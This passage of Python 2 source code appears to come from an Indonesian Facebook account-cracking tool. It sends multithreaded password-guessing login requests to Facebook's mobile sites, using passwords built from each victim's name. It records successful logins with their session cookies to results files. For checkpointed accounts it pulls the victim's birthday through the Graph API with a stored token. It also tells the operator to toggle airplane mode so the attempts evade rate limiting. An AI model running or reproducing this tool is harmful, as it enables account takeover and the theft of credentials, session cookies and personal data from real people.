            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, kuki, N)
                wrt = '\xe2\x95\xa0[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (O, user, pw, day, month, year, N)
                    wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s[\xe2\x80\xa2\xe2\x80\xa2]%s\x1b[096m[\x1b[097mCrack\x1b[096m][\x1b[097m%s/%s\x1b[096m][\x1b[092mOK:%s\x1b[097m][\x1b[093mCP:%s\x1b[097m] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s                 %s' % (H, user, pw, kuki, N)
                wrt = '\xe2\x95\xa0[Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s     %s' % (O, user, pw, day, month, year, N)
                    wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[CP] %s \xe2\x80\xa2 %s                %s' % (K, user, pw, N)
                wrt = '\xe2\x95\xa0[Cp] %s \xe2\x80\xa2 %s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[?] \x1b[0;97mMethod : ')
        print '%s\xe2\x95\x91%s ' % (O, N)
        if yan == '':
            print '%s[%s\xc3\x97%s] jangan kosong kentod' % (N, M, N)
            self.__pler__()
            print '%s\xe2\x95\x91%s ' % (O, N)
        elif yan in ('1', '01'):
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mId OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mId CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97m Airplane Mode 3 Seconds After Crack Starts\n' % (H, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
            print '%s\xe2\x95\x91%s ' % (O, N)
        elif yan in ('2', '02'):
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97m Airplane Mode 3 Seconds After Crack Starts\n' % (H, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
            print '%s\xe2\x95\x91%s ' % (O, N)
        elif yan in ('3', '03'):
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97m Airplane Mode 3 Seconds After Crack Starts\n' % (H, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
            print '%s\xe2\x95\x91%s ' % (O, N)
        elif yan in ('4', '04'):
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97m Airplane Mode 3 Seconds After Crack Starts\n' % (H, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
            print '%s\xe2\x95\x91%s ' % (O, N)
        elif yan in ('5', '05'):
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun OK Saved In > Results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s\x1b[0;96m] \x1b[0;97mAkun CP Saved In > Results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\x1b[0;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s!%s\x1b[0;96m] \x1b[0;97mAirplane Mode 3 Seconds After Crack Starts   \n' % (H, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
        else:
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s!%s] Choose the Right One   !!' % (N, O, N)
            self.__pler__()


if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()

